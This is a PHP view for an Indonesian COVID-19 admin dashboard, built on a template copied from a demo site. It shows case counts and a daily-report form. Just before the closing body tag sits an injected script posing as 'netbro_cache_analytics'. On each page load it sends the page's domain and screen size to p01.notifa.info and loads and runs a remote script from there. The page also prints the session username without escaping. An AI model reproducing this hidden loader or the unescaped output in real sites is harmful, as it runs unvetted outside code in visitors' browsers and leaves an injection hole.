<?php session_start(); ?>


<!DOCTYPE html>
<html lang="en">


<!-- Mirrored from demo.riktheme.com/amfan/side-menu-2/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 06 Jun 2020 02:11:06 GMT -->
<head>
    <meta charset="UTF-8">
    <meta name="description" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <!-- The above 4 meta tags *must* come first in the head; any other head content must come *after* these tags -->

    <!-- Title -->
    <title>Amfan - Responsive Bootstrap Admin &amp; Dashboard Template</title>

    <!-- Favicon -->
    <link rel="icon" href="<?= BASEURL;?>/AssetAdmin/img/core-img/favicon.png">
    <!-- These plugins only need for the run this page -->
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/default-assets/notification.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/c3.min.css">

    <!-- Master Stylesheet [If you remove this CSS file, your file will be broken undoubtedly.] -->
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/material-design-iconic-font.min.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/style.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/style1.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/font-awesome.min.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/default-assets/themify-icons.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/default-assets/select2.min.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/default-assets/jquery.bootstrap-touchspin.min.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/bootstrap-colorpicker.min.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/bootstrap-datepicker.min.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/default-assets/color-picker-bootstrap.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/default-assets/jquery.tagsinput.min.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/default-assets/daterange-picker.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/default-assets/form-picker.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/default-assets/notification.css">

</head>

<body>
<!-- Preloader -->
<div id="droba-loader">
    <div class="loader"></div>
</div>
<!--Preloader-->


<!-- Setting Panel -->
<div class="theme-setting-wrapper">
    <div id="settings-trigger"><i class="ti-settings font-17"></i></div>
    <div id="theme-settings" class="settings-panel">
        <i class="settings-close zmdi zmdi-close font-18 font-weight-bold"></i>
        <p class="settings-heading font-18">Side Menu Color :</p>
        <div class="sidebar-bg-options selected" id="sidebar-dark-theme">
            <div><span class="font-14 font-weight-bold">Default</span></div>
        </div>
        <div class="sidebar-bg-options" id="sidebar-light-theme">
            <div><span class="font-14 font-weight-bold">Light</span></div>
        </div>
        <div class="sidebar-bg-options" id="sidebar-color-theme">
            <div><span class="font-14 font-weight-bold">Colorfull</span></div>
        </div>
    </div>
</div>

<!-- ======================================
******* Page Wrapper Area Start **********
======================================= -->
<div class="ecaps-page-wrapper">
    <!-- Sidemenu Area -->
    <div class="ecaps-sidemenu-area">
        <!-- Desktop Logo -->
        <div class="ecaps-logo">
            <a href="index.html"><img class="desktop-logo" src="<?= BASEURL;?>/assets/images/logo/03.png" alt="Desktop Logo"> <img class="small-logo" src="<?= BASEURL;?>/AssetAdmin/img/core-img/small-logo.png" alt="Mobile Logo"></a>
        </div>

        <!-- Side Nav -->
        <div class="ecaps-sidenav" id="ecapsSideNav">
            <!-- Side Menu Area -->
            <div class="side-menu-area">
                <!-- Sidebar Menu -->

                <nav>
                    <ul class="sidebar-menu" data-widget="tree">
                        <li class="active"><a href="<?= BASEURL;?>/homeadmin"><i class="zmdi zmdi-view-dashboard"></i><span>Dashboard</span></a></li>
                        <li class="treeview">
                            <a href="javascript:void(0)"><i class="zmdi zmdi-apps"></i> <span>Apps</span> <i class="fa fa-angle-right"></i></a>
                            <ul class="treeview-menu">
                                <li><a href="<?= BASEURL;?>/buatakun">Data Akun</a></li>
                                <li><a href="<?= BASEURL;?>/page">Data Berita</a></li>
                            </ul>
                        </li>
                    </ul>
                </nav>
            </div>
        </div>
    </div>

    <!-- Page Content -->
    <div class="ecaps-page-content">
        <!-- Top Header Area -->
        <header class="top-header-area d-flex align-items-center justify-content-between">
            <div class="left-side-content-area d-flex align-items-center">
                <!-- Mobile Logo -->
                <div class="mobile-logo mr-3 mr-sm-4">
                    <a href="index.html"><img src="<?= BASEURL;?>/AssetAdmin/img/core-img/small-logo.png" alt="Mobile Logo"></a>
                </div>

                <!-- Triggers -->
                <div class="ecaps-triggers mr-1 mr-sm-3">
                    <div class="menu-collasped" id="menuCollasped">
                        <i class="zmdi zmdi-menu"></i>
                    </div>
                    <div class="mobile-menu-open" id="mobileMenuOpen">
                        <i class="zmdi zmdi-menu"></i>
                    </div>
                </div>
                <!-- Left Side Nav -->
            </div>
        </header>
        <!-- Main Content Area -->
        <div class="main-content">
            <div class="dashboard-area">
                <div class="container-fluid">
                    <div class="row align-items-center">
                        <div class="col-6">
                            <div class="dashboard-header-title mb-3">
                                <h5 class="mb-0 font-weight-bold">Dashboard</h5>

                                <p class="mb-0 font-weight-bold">Selamat Datang <?= $_SESSION['username'] ?>.</p>
                            </div>
                        </div>
                        <!-- Dashboard Info Area -->
                        <div class="col-6">
                            <div class="dashboard-infor-mation d-flex flex-wrap align-items-center mb-3">
                                <div class="dashboard-clock">
                                    <div id="dashboardDate">Monday, 21 October</div>
                                    <ul class="d-flex align-items-center justify-content-end">
                                        <li id="hours">12</li>
                                        <li>:</li>
                                        <li id="min">10</li>
                                        <li>:</li>
                                        <li id="sec">14</li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="row">
                        <!-- Time Date Area -->
                        <div class="col-12 box-margin">
                            <div class="card bg-boxshadow">
                                <div class="card-body px-3 py-2">
                                    <div class="user-important-data-info d-sm-flex align-items-center justify-content-between">

                                        <ul class="sales-reports d-flex align-items-center justify-content-between">
                                            <?php foreach ($this->tampungsementara as $num): ?>
                                            <li><span>Positif</span> <span class="counter"><?= $num['JMLPOS'] ?></span></li>
                                            <?php endforeach; ?>
                                            <?php foreach ($this->tampungsementara1 as $num): ?>
                                            <li><span>Sembuh</span> <span class="counter"><?= $num['JMLSEM'] ?></span></li>
                                            <?php endforeach; ?>
                                            <?php foreach ($this->tampungsementara2 as $num): ?>
                                            <li><span>Meninggal</span> <span class="counter"><?= $num['JMLMEN'] ?></span></li>
                                            <?php endforeach; ?>

                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="row">
                        <!-- Earning Area -->
                        <div class="col-md-6 box-margin height-card">
                        </div>

                        <!-- Best seller Area -->
                        <div class="col-md-6 height-card box-margin">

                        </div>

                        <div class="col-md-5 col-lg-4 box-margin">
                            <div class="card">
                                <div class="card-body">
                                    <h5 class="card-title">Total Kasus Di Indonesia</h5>
                                    <?php foreach ($this->tampungsementara3 as $num): ?>
                                    <h5><?= $num['JMLTOT'] ?></h5>
                                    <?php endforeach; ?>
                                    <div id="chart-percent1" class="chart-percent1" style="height:200px;"></div>
                                    <div class="client-name">
                                        <div class="row">
                                            <div class="col-sm-12 pt-2 pb-2">
                                                <span class="mr-3 font-weight-bold">Positif</span>
                                                <?php foreach ($this->tampungsementara as $num): ?>
                                                <span class="float-right font-weight-bold"><?= $num['JMLPOS'] ?></span>
                                                <?php endforeach; ?>
                                            </div>
                                            <div class="col-sm-12 pt-2 pb-2">
                                                <span class="mr-3 font-weight-bold">Sembuh</span>
                                                <?php foreach ($this->tampungsementara1 as $num): ?>
                                                <span class="float-right font-weight-bold"><?= $num['JMLSEM'] ?></span>
                                                <?php endforeach; ?>
                                            </div>
                                            <div class="col-sm-12 pt-2">
                                                <span class="mr-3 font-weight-bold">Meninggal</span>
                                                <?php foreach ($this->tampungsementara2 as $num): ?>
                                                <span class="float-right font-weight-bold"><?= $num['JMLMEN'] ?></span>
                                                <?php endforeach; ?>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-7 col-lg-8 box-margin">
                            <div class="card">
                                <div class="card-body">
                                    <div class="stacked-form-area">
                                        <h4 class="card-title">Laporan Form</h4>
                                        <form action="<?= BASEURL;?>/homeadmin/jumlahharian" method="post">
                                            <label for="fname">Positif</label>
                                            <input type="text" id="fname" name="positif" placeholder="Positif..">
                                            <label for="lname">Sembuh</label>
                                            <input type="text" id="lname" name="sembuh" placeholder="Sembuh..">
                                            <label for="lname">Meninggal</label>
                                            <input type="text" id="lname" name="meninggal" placeholder="Meninggal..">
                                            <label>Autoclose</label>
                                            <input type="text" name="tanggal" class="form-control" data-provide="datepicker" data-date-autoclose="true">

                                            <input class="btn btn-primary btn-block mt-15" type="submit" value="Submit">
                                        </form>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- ======================================
********* Page Wrapper Area End ***********
======================================= -->

<!-- Must needed plugins to the run this Template -->
<script src="<?= BASEURL;?>/AssetAdmin/js/jquery.min.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/popper.min.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/bootstrap.min.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/bundle.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/date-time.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/setting.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/fullscreen.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/bootstrap-growl.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/notification-active.js"></script>

<!-- Active JS -->
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/active.js"></script>

<!-- These plugins only need for the run this page -->
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/peity.min.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/peity-demo.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/am-chart.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/gauge.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/serial.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/light.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/ammap.min.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/worldlow.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/radar.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/d3.min.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/c3.min.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/c3-chart-custom.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/dashboard-2.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/file-upload.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/basic-form.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/jquery.bootstrap-touchspin.min.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/jquery.bootstrap-touchspin.custom.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/bootstrap-colorpicker.min.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/colorpicker-bootstrap.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/jquey.tagsinput.min.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/bootstrap-datepicker.min.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/daterange-picker.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/form-picker.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/select2.min.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/select2-custom.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/bootstrap-growl.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/notification-active.js"></script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXqtyRNyMjONYkP5k3ON12jwp0AhcKQ%2b8%2fdliip3MSqxb4gEVFhKO%2f0M4Ye5Jq25UvS4YI3cGfDoS6BNmuzONInNEfTrj79bt7i0kpMTUhpv3Z6YdBa05BAHcl0sEpOYFRMr4qKVdj1mGvxcolQq5DGRuWMw3BMVP1my%2bt2nDOYQbYggK9cg34OBe2SFgpTW8FEZXiJvxLBDfXv6XVduFNeB72O5yUkR%2bAZvQ5bO4meY0%2fTYtbHI%2bUYtjiWjb991aNGdAehStwwOIBTheo%2bqPXFUe%2fb1pwId6s%2ff3vZdQGFoC5JjWscRGWXRsexwg94gauUIpB0xPrWIGtEUEuBhEkHtvNjQNW79goAJf6SWl1Iw1%2bRJU1mAOgz4fkMq8WQcXBUzacpLYdJqcuIesK7u80VZe%2bb1G1Pr3haQGG8Lrl%2f0qZqR9N3oFs5ZntNrLfCh0Hqy1RoDx9hxYvbqJBWXqiI5QnH%2bi1cw%2bM3m64CUNiMwK%2fd3zkV2LKUA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


<!-- Mirrored from demo.riktheme.com/amfan/side-menu-2/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 06 Jun 2020 02:13:11 GMT -->
</html>